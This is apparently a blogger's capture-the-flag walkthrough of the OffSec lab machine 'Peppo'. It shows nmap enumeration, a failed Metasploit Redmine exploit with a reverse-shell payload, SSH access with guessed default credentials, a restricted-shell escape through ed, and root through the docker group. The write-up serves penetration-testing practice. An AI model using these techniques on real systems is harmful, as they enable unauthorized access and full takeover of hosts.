---
title: Writeup - Offsec PG Peppo
date: 2023-10-18 
author: kei5uke
description: Writeup for PG Peppo 
tags:
  - linux
  - writeup
---

# Peppo

# Nmap Enumration

```bash
# Nmap 7.94 scan initiated Tue Oct 17 10:21:56 2023 as: nmap -sC -sV -p- -T4 -oN nmap.txt 192.168.239.60
Nmap scan report for 192.168.239.60
Host is up (0.044s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE           VERSION
22/tcp    open   ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
|_auth-owners: root
| ssh-hostkey: 
|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)
|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)
|_  256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)
53/tcp    closed domain
113/tcp   open   ident             FreeBSD identd
|_auth-owners: nobody
5432/tcp  open   postgresql        PostgreSQL DB 12.3 - 12.4
8080/tcp  open   http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
| http-robots.txt: 4 disallowed entries 
|_/issues/gantt /issues/calendar /activity /search
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)
|_http-title: Redmine
10000/tcp open   snet-sensor-mgmt?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Tue, 17 Oct 2023 07:24:12 GMT
|     Connection: close
|     Hello World
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Tue, 17 Oct 2023 07:24:06 GMT
|     Connection: close
|_    Hello World
|_auth-owners: eleanor
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.94%I=7%D=10/17%Time=652E3696%P=aarch64-unknown-linux-
SF:gnu%r(GetRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/pl
SF:ain\r\nDate:\x20Tue,\x2017\x20Oct\x202023\x2007:24:06\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\nHello\x20World\n")%r(HTTPOptions,71,"HTTP/1\.1\x20
SF:200\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Tue,\x2017\x20Oct\
SF:x202023\x2007:24:06\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20Worl
SF:d\n")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnectio
SF:n:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSStatus
SF:RequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clo
SF:se\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnectio
SF:n:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,2F,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(TLSS
SF:essionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clos
SF:e\r\n\r\n")%r(Kerberos,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnec
SF:tion:\x20close\r\n\r\n")%r(SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nConnection:\x20close\r\n\r\n")%r(X11Probe,2F,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(FourOhFourReques
SF:t,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x2
SF:0Tue,\x2017\x20Oct\x202023\x2007:24:12\x20GMT\r\nConnection:\x20close\r
SF:\n\r\nHello\x20World\n")%r(LPDString,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(LDAPSearchReq,2F,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(LDAPBindReq,
SF:2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n"
SF:)%r(SIPOptions,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(LANDesk-RC,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(TerminalServer,2F,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OSs: Linux, FreeBSD; CPE: cpe:/o:linux:linux_kernel, cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 17 10:24:44 2023 -- 1 IP address (1 host up) scanned in 167.59 seconds
```

I can see some user names such as nobody, eleanor, root

# HTTP 8080 - Redmine

![Screenshot 2023-10-18 at 10.24.42.png](Peppo%203686053f39664308a95784e6e3c84088/Screenshot_2023-10-18_at_10.24.42.png)

![Screenshot 2023-10-18 at 10.25.20.png](Peppo%203686053f39664308a95784e6e3c84088/Screenshot_2023-10-18_at_10.25.20.png)

I could login as admin with a password “admin” however I couldn’t find anything useful here.

```bash
msf6 exploit(unix/webapp/redmine_scm_exec) > show options

Module options (exploit/unix/webapp/redmine_scm_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Me
                                       tasploit
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   URI      /projects/1/     yes       The full URI path to the project
   VHOST                     no        HTTP server virtual host

Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.211.55.20     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(unix/webapp/redmine_scm_exec) > set LSHOT 192.168.45.240
LSHOT => 192.168.45.240
msf6 exploit(unix/webapp/redmine_scm_exec) > set RHOST 192.168.239.60
RHOST => 192.168.239.60
msf6 exploit(unix/webapp/redmine_scm_exec) > set RPORT 8080
RPORT => 8080
msf6 exploit(unix/webapp/redmine_scm_exec) > run

[*] Started reverse TCP double handler on 10.211.55.20:4444 
[*] The server returned: 404 Not Found 
[*] Exploit completed, but no session was created.
```

I tried redmine vulnerability that I found, however this does not work.

# SSH

I decided to check the hint on offsec website and it says that useable username should be found in nmap enumeration.

It turned out that you can ssh the user “eleanor” with the password “eleanor”.

# Getting out of Restricted Shell

```bash
eleanor@peppo:~$ compgen -c
if
then
else
elif
fi
case
esac
for
select
while
until
do
done
in
function
time
{
}
!
[[
]]
coproc
__expand_tilde_by_ref
__get_cword_at_cursor_by_ref
__git_eread
__git_ps1
__git_ps1_colorize_gitstring
__git_ps1_show_upstream
__grub_dir
__grub_get_last_option
__grub_get_options_from_help
__grub_get_options_from_usage
__grub_list_menuentries
__grub_list_modules
__grubcomp
__ltrim_colon_completions
__parse_options
__reassemble_comp_words_by_ref
_allowed_groups
_allowed_users
_available_interfaces
_cd
_cd_devices
_command
_command_offset
_complete_as_root
_completion_loader
_configured_interfaces
_count_args
_dkms
_dvd_devices
_expand
_filedir
_filedir_xspec
_filename_parts
_fstypes
_get_comp_words_by_ref
_get_cword
_get_first_arg
_get_pword
_gids
_grub_editenv
_grub_install
_grub_mkconfig
_grub_mkfont
_grub_mkimage
_grub_mkpasswd_pbkdf2
_grub_mkrescue
_grub_probe
_grub_script_check
_grub_set_entry
_grub_setup
_have
_init_completion
_installed_modules
_ip_addresses
_kernel_versions
_kernels
_known_hosts
_known_hosts_real
_longopt
_mac_addresses
_minimal
_modules
_ncpus
_parse_help
_parse_usage
_pci_ids
_pgids
_pids
_pnames
_quote_readline_by_ref
_realcommand
_rl_enabled
_root_command
_service
_services
_shells
_signals
_split_longopt
_subdirectories
_sysvdirs
_terms
_tilde
_uids
_upvar
_upvars
_usb_ids
_user_at_host
_usergroup
_userland
_variables
_xfunc
_xinetd_services
dequote
quote
quote_readline
.
:
[
alias
bg
bind
break
builtin
caller
cd
command
compgen
complete
compopt
continue
declare
dirs
disown
echo
enable
eval
exec
exit
export
false
fc
fg
getopts
hash
help
history
jobs
kill
let
local
logout
mapfile
popd
printf
pushd
pwd
read
readarray
readonly
return
set
shift
shopt
source
suspend
test
times
trap
true
type
typeset
ulimit
umask
unalias
unset
wait
sleep
chown
ls
chmod
ed
ping
touch
mv
```

Here are list of executable commands 

```bash
eleanor@peppo:~$ mapfile TMP < local.txt
eleanor@peppo:~$ echo $TMP
42f72803bb58fd45d033803258c09111
```

mapfile allows you to print text.

```bash
eleanor@peppo:~$ ed 
!/bin/bash
eleanor@peppo:~$ 
eleanor@peppo:~$ ls
bin  helloworld  local.txt
eleanor@peppo:~$ cd /
eleanor@peppo:/$ ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
```

ed command is the way to get out of the restricted shell environment.

[ed | GTFOBins](https://gtfobins.github.io/gtfobins/ed/)

# Privilege Escalation

```bash
eleanor@peppo:/$ id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
eleanor@peppo:/$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for eleanor: 
Sorry, user eleanor may not run sudo on peppo.
```

I can see that docker is installed in the machine.

```bash
eleanor@peppo:/tmp$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        3 years ago         542MB
postgres            latest              adf2b126dda8        3 years ago         313MB
eleanor@peppo:/tmp$ docker run -v /:/mnt --rm -it redmine chroot /mnt sh
# whoami
root
# pwd
/
```

[docker | GTFOBins](https://gtfobins.github.io/gtfobins/docker/)

I checked the list of image and run with the command that I found in GTFO.

# Root

![Screenshot 2023-10-18 at 10.15.07.png](Peppo%203686053f39664308a95784e6e3c84088/Screenshot_2023-10-18_at_10.15.07.png)

Now you pwn.

# Note

It took me long time to figure out how to get shell, but the clue was in the nmap enumeration all the time in the first place. And shell restriction kinda freaked me out. This machine is indeed HARD level.